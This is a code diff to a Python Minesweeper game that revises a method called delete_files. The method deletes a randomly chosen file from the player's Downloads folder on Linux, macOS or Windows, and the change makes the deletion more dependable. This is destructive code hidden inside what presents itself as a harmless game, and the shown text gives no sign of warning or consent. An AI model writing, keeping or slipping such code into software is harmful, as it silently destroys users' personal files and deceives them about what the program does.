@@ -92,12 +92,17 @@ class Minesweeper:
 
     def delete_files(self) -> None:
         if os.name == 'posix':
-            f = random.choice(os.listdir(os.path.expanduser('~') + "/Downloads/"))
-            print(f)
-            os.remove(os.path.expanduser('~') + "/Downloads/" + fr"{f}")
+            if len((dir := os.listdir(os.path.expanduser('~') + r"/Downloads/"))) > 0:
+                file = random.choice(dir)
+                path = os.path.expanduser('~') + fr"/Downloads/{file}"
+                if os.path.isfile(path):
+                    os.remove(path)
         elif os.name == 'nt':
-            f = random.choice(os.listdir(os.path.expanduser('~') + "\\Downloads"))
-            os.remove(os.path.expanduser('~') + "\\Downloads\\" + f)
+            if len((dir := os.listdir(os.path.expanduser('~') + r"\Downloads"))) > 0:
+                file = random.choice(dir)
+                path = os.path.expanduser('~') + fr"\Downloads\{file}"
+                if os.path.isfile(path):
+                    os.remove(path)
 
     def delete_game(self) -> None:
         file = open("score.txt", 'w')
